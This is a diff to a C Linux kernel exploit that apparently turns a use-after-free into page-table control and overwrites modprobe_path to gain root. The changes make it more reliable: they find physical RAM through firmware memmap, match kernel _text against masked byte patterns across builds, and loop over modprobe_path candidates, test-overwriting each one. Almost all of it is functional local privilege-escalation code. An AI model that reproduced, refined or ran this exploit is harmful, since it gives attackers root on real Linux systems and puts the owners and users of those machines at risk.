@@ -28,7 +28,6 @@
 #include <sched.h>
 #include <sys/user.h>
 #include <sys/mman.h>
-#include <sys/sysinfo.h>
 #include <sys/socket.h>
 #include <sys/wait.h>
 #include <linux/if_alg.h>
@@ -139,6 +138,70 @@ int act(int act_fd, int code, int n, char *args)
  *  - perform uaf write using the dangling reference to the vulnerable object
  *  - change modprobe_path using the overwritten page table
  */
+
+#define GIB (1ULL << 30)
+
+unsigned int get_max_phys_gib(void)
+{
+	unsigned long long max_addr = 0;
+	unsigned long long addr = 0;
+	char buf[32] = { 0 };
+	char path[64] = { 0 };
+	ssize_t bytes = 0;
+	int fd = -1;
+	int i = 0;
+
+	for (i = 0;; i++) {
+		snprintf(path, sizeof(path), "/sys/firmware/memmap/%d/type", i);
+
+		fd = open(path, O_RDONLY);
+		if (fd < 0)
+			break;
+
+		bytes = read(fd, buf, sizeof(buf) - 1);
+		close(fd);
+		if (bytes <= 0) {
+			printf("[-] failed to read memmap type\n");
+			return 0;
+		}
+
+		buf[bytes] = 0;
+		if (strcmp(buf, "System RAM\n") != 0)
+			continue;
+
+		snprintf(path, sizeof(path), "/sys/firmware/memmap/%d/end", i);
+
+		fd = open(path, O_RDONLY);
+		if (fd < 0) {
+			perror("[-] open memmap end");
+			return 0;
+		}
+
+		bytes = read(fd, buf, sizeof(buf) - 1);
+		close(fd);
+		if (bytes <= 0) {
+			printf("[-] failed to read memmap end address\n");
+			return 0;
+		}
+
+		buf[bytes] = 0;
+		if (sscanf(buf, "%llx", &addr) != 1) {
+			printf("[-] invalid memmap end address\n");
+			return 0;
+		}
+
+		if (addr > max_addr)
+			max_addr = addr;
+	}
+
+	if (max_addr == 0) {
+		printf("[-] failed to read memmap RAM entries\n");
+		return 0;
+	}
+
+	/* Firmware memmap end addresses are inclusive. */
+	return max_addr / GIB + 1;
+}
 
 /* clang-format off */
 #define PTE_INDEX_TO_VIRT(i) ((unsigned long)i << 12)
@@ -326,7 +389,7 @@ int get_modprobe_path(char *buf, size_t buf_size)
 }
 
 /*
- * The first 16 bytes of kernel _text. Collected on:
+ * The first 16 bytes of kernel _text. Must be collected on a live boot via gdb, tested on:
  *  1. Dozens of v6.x.x defconfig kernels,
  *  2. Ubuntu 6.12.28, 6.10.11, 6.6.89,
  *  3. Debian 6.12.25, 6.11.6, 6.1.10.
@@ -338,6 +401,23 @@ int get_modprobe_path(char *buf, size_t buf_size)
 	  "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90", \
 	  "\xfc\x0f\x01\x15\xa0\xdc\x77\x03\xb8\x10\x00\x00\x00\x8e\xd8\x8e", \
 	  "\x48\x8d\x25\x51\x3f\xa0\x01\x48\x8d\x3d\xf2\xff\xff\xff\xb9\x01" }
+
+/*
+ * Some instructions contain a 4-byte displacement:
+ *
+ *   48 8d 25 XX XX XX XX - lea rsp, [rip + disp32]
+ *   48 8d 3d XX XX XX XX - lea rdi, [rip + disp32]
+ *   0f 01 15 XX XX XX XX - lgdt [rip + disp32]
+ *
+ * Those bytes may vary between kernel builds and even boots
+ */
+
+#define KERNEL_TEXT_MASKS         \
+	{ "xxxxxx????xxxxxx",    \
+	  "xxxxxx????xxx???",    \
+	  "xxxxxxxxxxxxxxxx",    \
+	  "xxxx????xxxxxxxx",    \
+	  "xxx????xxx????xx" }
 /* clang-format on */
 
 #define KERNEL_TEXT_PATTERN_LEN 16
@@ -345,14 +425,17 @@ int get_modprobe_path(char *buf, size_t buf_size)
 int is_kernel_text(void *addr)
 {
 	char *patterns[] = KERNEL_TEXT_PATTERNS;
+	char *masks[] = KERNEL_TEXT_MASKS;
 	size_t n = sizeof(patterns) / sizeof(char *);
 	size_t i = 0;
 	size_t j = 0;
-	char *bytes = addr;
+	unsigned char *bytes = addr;
 
 	for (i = 0; i < n; i++) {
 		for (j = 0; j < KERNEL_TEXT_PATTERN_LEN; j++) {
-			if (bytes[j] != patterns[i][j])
+			if (masks[i][j] == '?')
+				continue;
+			if (bytes[j] != (unsigned char)patterns[i][j])
 				break;
 		}
 		if (j == KERNEL_TEXT_PATTERN_LEN)
@@ -363,6 +446,8 @@ int is_kernel_text(void *addr)
 
 /* Default value from arch/x86/Kconfig */
 #define CONFIG_PHYSICAL_ALIGN 0x200000
+/* modprobe_path lives close enough to _text segment */
+#define MEMSEARCH_WINDOW_MAX (64 * 1024 * 1024)
 
 void *memmem_modprobe_path_bruteforce(void *memory, size_t memory_size)
 {
@@ -373,7 +458,9 @@ void *memmem_modprobe_path_bruteforce(void *memory, size_t memory_size)
 	char *kernel_text = NULL;
 	char modprobe_path[KMOD_PATH_LEN] = { 0 };
 	size_t modprobe_path_len = 0;
-	char *modprobe_path_uaddr = NULL;
+        char *modprobe_path_uaddr = NULL;
+	char *window_end;
+	char *scan;
 
 	/*
 	 * We search for kernel _text first.
@@ -405,33 +492,41 @@ void *memmem_modprobe_path_bruteforce(void *memory, size_t memory_size)
 	}
 
 	modprobe_path_len = strlen(modprobe_path);
-	modprobe_path_uaddr =
-		memmem(kernel_text, end - kernel_text, modprobe_path, modprobe_path_len);
-	if (modprobe_path_uaddr == NULL) {
-		printf("[!] modprobe_path is not found in this memory region\n");
-		return NULL;
+
+	window_end = kernel_text + MEMSEARCH_WINDOW_MAX;
+	if (window_end > end)
+		window_end = end;
+
+	scan = kernel_text;
+	/* false hit moves to the next candidate */
+	while (scan < window_end) {
+		modprobe_path_uaddr =
+			memmem(scan, window_end - scan, modprobe_path, modprobe_path_len);
+		if (modprobe_path_uaddr == NULL) {
+			printf("[!] modprobe_path is not found in this memory region\n");
+			return NULL;
+		}
+		printf("[+] found modprobe_path candidate at %p\n", modprobe_path_uaddr);
+
+		/* Test overwriting modprobe_path */
+		modprobe_path_uaddr[0] = 'x';
+		ret = get_modprobe_path(modprobe_path, KMOD_PATH_LEN);
+		/* Return the initial value back for now */
+		modprobe_path_uaddr[0] = '/';
+		if (ret == EXIT_FAILURE)
+			return NULL;
+
+		if (modprobe_path[0] == 'x') {
+			printf("[+] testing modprobe_path overwriting succeeded\n");
+			return modprobe_path_uaddr;
+		}
+
+		printf("[!] modprobe_path overwriting failed, try the next candidate\n");
+		scan = modprobe_path_uaddr + 1;
 	}
-	printf("[+] found modprobe_path candidate at %p\n", modprobe_path_uaddr);
 
-	/* Test overwriting modprobe_path */
-	modprobe_path_uaddr[0] = 'x';
-
-	ret = get_modprobe_path(modprobe_path, sizeof(modprobe_path));
-	if (ret == EXIT_FAILURE)
-		return NULL;
-
-	/* Return the initial value back for now */
-	modprobe_path_uaddr[0] = '/';
-
-	if (modprobe_path[0] != 'x') {
-		printf("[!] modprobe_path overwriting failed, start a new search\n");
-		/* Recursion */
-		return memmem_modprobe_path_bruteforce(modprobe_path_uaddr,
-						       end - modprobe_path_uaddr);
-	}
-
-	printf("[+] testing modprobe_path overwriting succeeded\n");
-	return modprobe_path_uaddr;
+	printf("[!] modprobe_path is not found in this memory region\n");
+	return NULL;
 }
 
 /* Fileless approach */
@@ -520,18 +615,15 @@ int main(void)
 	long reserved_from_n = 0;
 	long uaf_n = 0;
 	unsigned long phys_addr = 0;
-	struct sysinfo info = { 0 };
 	int huge_pages_n = 0;
 
 	printf("begin as: uid=%d, euid=%d\n", getuid(), geteuid());
 
-	if (sysinfo(&info) != 0) {
-		perror("[!] sysinfo");
+	huge_pages_n = get_max_phys_gib();
+	if (!huge_pages_n)
 		goto end;
-	}
 
-	huge_pages_n = (info.totalram * info.mem_unit / 1024 / 1024 + 1023) / 1024;
-	printf("[!] physical memory can be addressed by %d GiB huge pages\n", huge_pages_n);
+	printf("[!] physical RAM upper bound: %d GiB\n", huge_pages_n);
 
 	ret = prepare_page_tables();
 	if (ret == EXIT_FAILURE)
